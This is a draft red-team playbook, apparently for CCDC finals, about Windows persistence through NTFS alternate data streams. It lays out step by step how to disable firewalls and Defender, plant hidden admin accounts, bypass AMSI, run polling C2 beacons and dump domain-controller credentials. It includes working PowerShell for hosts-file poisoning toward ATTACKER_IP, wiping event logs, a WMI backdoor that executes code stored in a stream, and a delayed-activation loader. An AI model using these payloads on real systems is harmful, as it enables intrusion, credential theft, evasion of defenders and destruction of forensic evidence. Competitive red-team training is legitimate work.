# ADS Competition Strategy — CCDC Finals

> **STATUS: DRAFT — Needs review and refinement before Finals.**
>
> **Known issues in this document:**
> - `-Encrypt` flag references assume **BUG-011 is resolved** (Defender flags encrypted payloads as Trojans). Until resolved: omit `-Encrypt` or test unencrypted deployment instead.
> - **WMI persistence** (Tier 4) is included for reference only. WMI event subscriptions were deliberately **removed from ADS** (v2.3) due to worse detection surface than Task Scheduler + Registry. Do not use WMI through the ADS framework unless it is re-evaluated and re-added.
> - `-ZeroWidthStreams` is **not a valid ADS parameter**. Use `-Obfuscate Advanced` or `-Obfuscate Paranoid` to enable zero-width stream names.
> - Cross-reference with `competition/DEPLOYMENT-GUIDE.md` (infrastructure/operational details) and `competition/QUICK-REFERENCE.md` (per-tier command syntax).

---

## Tier 1: Bread-and-Butter Operations (High Impact, Proven Reliable)

The firewall takedown payload (FW-002 via netsh) is your most battle-tested payload. Deploy it encrypted with task persistence on every Windows box as your first action after initial access. Use `InstanceCount 3` for redundancy — if blue team finds and kills one task, two more keep firing every 5 minutes. Pair it with OnIdle and OnUnlock triggers so the firewall drops again every time someone sits down at the machine.

Combine FW-002 with USR (hidden admin creation) in a COMBO payload as your second deployment. Once the firewall is persistently down and you have a hidden admin account, your access is extremely resilient. The hidden admin account (with SpecialAccounts\UserList registry hiding) gives you fallback access even if blue team rotates all passwords, and ADS persistence means your access mechanism isn't visible in normal file listings.

For each competition host, the deployment tempo should be: (1) gain access, (2) deploy FW+admin combo encrypted with 3 instances, (3) verify task persistence fires, (4) move to next host. The entire deployment takes about 30 seconds per box — generate the payloads on Kali before the competition starts.

---

## Tier 2: Persistent Access Infrastructure

Deploy C2-005 (polling beacon) on critical infrastructure boxes (Domain Controller, DNS server, web servers). This gives you a persistent tasking channel — the beacon checks your attack box every 5 minutes for new commands, and you can dynamically push new payloads without re-accessing the box. The ADS framework handles the persistence; the beacon handles the command channel.

For the DC specifically, deploy CRED (credential access) payloads that periodically dump hashes or monitor for password changes. ADS encryption with hardware-derived keys means even if blue team finds the ADS, they can't read the payload without running it on that specific machine.

---

## Tier 3: Defense Disruption (Aggressive but High Payoff)

SVC-006 (kill EDR/AV services) deployed via ADS with 5-minute periodic execution means Defender gets disabled every 5 minutes even if blue team keeps re-enabling it. Combined with DEF (Defender exclusion) payloads, you create a persistent blind spot in their monitoring.

The AMSI bypass in the delivery pipeline is critical here — without it, Defender blocks the deployment script itself. The dual-layer bypass (Layer A at deployment, Layer B at task execution) means both the initial paste and every subsequent periodic execution bypass scanning.

---

## Tier 4: Novel/Unconsidered Uses

**DNS Poisoning via ADS Persistence**: Deploy a payload that periodically overwrites the hosts file (`C:\Windows\System32\drivers\etc\hosts`) to redirect blue team's management URLs to your attack box. When they try to access their monitoring dashboard, they land on your phishing page. ADS persistence means the hosts file gets re-poisoned every 5 minutes.

```powershell
# Hosts file poison — redirects monitoring to attacker
$entries = @"
ATTACKER_IP  monitoring.corp.local
ATTACKER_IP  siem.corp.local
ATTACKER_IP  splunk.corp.local
"@
$entries | Out-File "$env:SystemRoot\System32\drivers\etc\hosts" -Append -Force
```

**Event Log Cleaner via ADS**: A persistent payload that clears Security and PowerShell event logs every 10 minutes, destroying forensic evidence of your other operations. Combined with ScriptBlock logging disable (in the COMBO payloads), this creates a persistent forensic dead zone.

```powershell
# Periodic log sanitizer
@('Security','Microsoft-Windows-PowerShell/Operational','Windows PowerShell') | ForEach-Object {
    wevtutil cl $_ 2>$null
}
```

**WMI Event Subscription Backdoor** *(Reference only — NOT implemented in ADS)*: WMI permanent event subscriptions survive scheduled task cleanup and are harder for blue teams to find. WMI was evaluated and removed from ADS (v2.3) due to detection surface concerns. Included here for future re-evaluation if a stealth justification emerges.

```powershell
# WMI persistence layer — fires every 300 seconds, survives task cleanup
# NOTE: gwmi/Set-WmiInstance deprecated in PS 7; use PS 5.1 only
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = 'CoreNetworkFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'CoreNetworkConsumer'
    CommandLineTemplate = "powershell.exe -NoP -W Hidden -EP Bypass -C `"IEX(gc 'C:\ProgramData\host.dat:stream' -Raw)`""
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
}
```

**Service Binary Hijack**: Instead of creating new services (noisy), identify existing services with unquoted paths or weak ACLs and plant your payload in the search path. Use ADS to store the hijack binary and a loader that copies it into position. Blue team fixes the service? The ADS payload puts it back every 5 minutes.

**Scheduled Task Name Camouflage**: You already have randomized task names (`-Obfuscate` tiers), but consider using exact names of legitimate Microsoft tasks. `\Microsoft\Windows\UpdateOrchestrator\Schedule Scan` or `\Microsoft\Windows\Defrag\ScheduledDefrag` are real tasks that blue teams won't delete. Register your task under the same task path (different folder under `\Microsoft\Windows\`) and blue teams scanning task lists will skip right over it.

---

## Tier 5: Chaos Engineering (Style Points)

Deploy MEME-001 (goose flock) on the scoreboard server or a highly visible box. Deploy MEME-006 (clipboard rickroll) on boxes where blue team members frequently paste commands — every paste becomes a rickroll. MEME-007 (cursor earthquake) on the DC is particularly devastating because AD management requires precise clicks. The 3-pixel jitter is subtle enough to waste significant time before they realize it's not a driver issue.

For maximum competition impact, layer the meme payloads with operational payloads on the same box using multi-instance deployment. Instance 1 disables the firewall, Instance 2 runs the polling beacon, and Instance 3 launches the goose flock. Blue team finds and kills the geese, feels accomplished, never realizes the other two instances are still running.

See `payloads/MEME-PAYLOADS.md` for full meme payload library.

---

## Competition Tempo Playbook

**Pre-competition (on Kali):**

Generate payloads for every scenario using the payload library. Have FW-002, COMBO-002 (stealth package), C2-005 (beacon), and one meme payload pre-generated as separate files. Name them by target role: `dc-fw.txt`, `dc-combo.txt`, `web-beacon.txt`, etc.

**First 5 minutes (after initial access):**

Deploy COMBO-002 (stealth package) to every box you can reach. This single payload disables the firewall via rules (not full disable — stealthier), creates a hidden admin, adds Defender exclusions, and disables logging. One paste per box.

**Minutes 5–15 (persistence):**

Deploy C2-005 (polling beacon) with 3 instances to critical infrastructure. Set up your tasking server on Kali (`python3 -m http.server 8080`). Now you have persistent, encrypted command channels to every box.

**Minutes 15+ (maintenance and chaos):**

Use the polling beacon to push new payloads as needed. If blue team patches one hole, push a new exploit through the beacon. Deploy meme payloads for style points when you have comfortable access. Monitor for blue team defensive actions via the beacon and adapt.

---

## Future Capabilities (Not Yet Implemented — Research Items)

Ideas flagged for future development. These are not in the current ADS framework.

**ADS on VSS Snapshots**: Windows VSS snapshots include ADS. If blue team restores from a shadow copy to undo your changes, your ADS persistence comes back with it. ADS written to files in the VSS-protected set survives restore operations.

**ADS on Network Shares**: NTFS ADS works on SMB network shares. If a target has a mounted share from another box, you can write ADS to files on the remote share without direct access to the remote machine. Payload storage spans two machines — forensic analysis becomes much harder.

**ADS Chain Loading**: Instead of storing the full payload in one ADS, split it across multiple streams and have a tiny loader that reads and concatenates them. No single stream triggers content-based detection; individual streams show only fragments.

**Environment-Keyed Payloads**: Beyond hardware-derived encryption, key payloads to specific environmental conditions: only execute if hostname matches a pattern, only during business hours, only if certain services are running. Prevents sandbox analysis and makes extracted payloads useless to blue team.

**Time-Delayed Activation**: Deploy dormant ADS on day 1 that only activate after a time threshold. Blue team's initial sweep finds nothing, they declare the box clean, then 2 hours later persistence kicks in.

```powershell
# Time-bomb: sleeps until activation, then executes real payload
$activateAt = [DateTime]'2026-04-15 14:00:00'  # Set to competition day + offset
while((Get-Date) -lt $activateAt){ Start-Sleep -Seconds 60 }
# Execute real payload
IEX(gc "$env:ProgramData\host.dat:stream" -Raw)
```

**Decoy ADS Blue Team Traps**: Create obviously-detectable ADS with honeypot payloads that look real but do nothing. Blue team spends time analyzing and removing them while your real payloads (zero-width stream names) remain invisible. Ratio: 10 obvious decoys per 1 real payload. *(Decoy stream creation is partially implemented in current ADS — see `-Decoy` option.)*

**Time Stomping**: Critical anti-forensic technique — modify ADS host file timestamps to match surrounding files so the host file doesn't appear freshly modified in forensic timeline analysis. *(Already implemented in v2.4 via timestamp anti-forensics in `ADS-Dropper.ps1`.)*
